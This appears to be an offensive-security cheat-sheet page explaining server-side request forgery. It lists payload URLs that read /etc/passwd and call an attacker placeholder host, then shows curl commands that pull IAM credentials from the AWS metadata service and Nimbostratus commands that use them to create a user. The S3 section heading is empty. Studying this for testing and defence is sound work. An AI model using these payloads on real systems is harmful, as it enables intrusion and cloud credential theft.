# Server-side request forgery

Server-side request forgery \(SSRF\) exploits the trusted relationship between a web server and other backend systems which are not normally accessible to an attacker \(e.g. because of firewalls or application rules\). They are particularly dangerous in cloud infrastructure like AWS, because SSRF allows an attacker to query internal services like [Amazon's metadata API](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) for credentials and other sensitive data.

## Techniques

### Basic

Generally, you'll be looking for poorly-sanitized parameters which accept URLs, either in `GET` or `POST` requests. In the examples below, `localhost` is used in the URL to access to data and services which are only accessible via the local network.

Example `GET` request with a vulnerable open redirect:

```text
http://[host]/page?url=http://localhost/api/getuser/id/1
```

Example `POST` request with a similarly unsanitized URL parameter:

```text
POST /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

url=http://localhost:1234
```

Some SSRF attacks will return a response that you can see on the vulnerable website, but others may be blind.

You can also test protocols other than HTTP:

```text
http://[host]/page.php?url=file:///etc/passwd
http://[host]/page.php?url=dict://[evilhost]:1234/
http://[host]/page.php?url=sftp://[evilhost]:1234/
http://[host]/page.php?url=ldap://localhost:1234/%0astats%0aquit
```

### Attacking AWS with SSRF

Amazon's AWS has an internal metadata service which can be queried from any instance. Attackers can use SSRF vulnerabilities to retrieve instance information and in some cases make changes to the infrastructure. [Amazon's CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-ec2-instances.html) performs a similar function.

There are two metadata standards for the AWS API - the newest one requires you to generate a short-term token before issuing commands. However, the older non-token version does not seem to be going away, so you could simply use `curl http://169.254.169.254/` to get the same data.

The following command from [Amazon's metadata documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) allows you to generate a 6-hour token, save it in a variable and display the top-level metadata items:

```text
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```

The top-level metadata items will look something like this: 

```text
ami-id
ami-launch-index
...
profile
public-keys/
reservation-id
security-groups
```

From there, you can make calls to the API to view each of the metadata items in detail. To view security credentials for the instance:

```text
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Once you have a role name, you can request credentials for that role: 

```text
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/SomeRole

{
  "Code" : "Success",
  "LastUpdated" : "2019-12-03T18:08:16Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "V...",
  "Token" : "SomeBase64==",
  "Expiration" : "2019-12-04T00:17:43Z"

```

At this point you may want to consider automated AWS metadata enumeration tools like [Nimbostratus](https://andresriancho.github.io/nimbostratus/) to determine the permissions available to that role:

```text
sudo python nimbostratus dump-permissions --access-key=ASIA... --secret-key=V...
```

You can also attempt to create a new user, as a proof-of-concept:

```text
sudo python nimbostratus create-iam-user --access-key=ASIA... --secret-key=p...
```

### Enumerating S3 buckets

## Further reading

* [SSRF: Web Security Academy](https://portswigger.net/web-security/ssrf)
* [SSRF: types and exploits](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
* [SSRF and the CapitalOne breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
* [Nimbostratus: tools for fingerprinting and exploiting Amazon](https://andresriancho.github.io/nimbostratus/)
* [SSRF payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

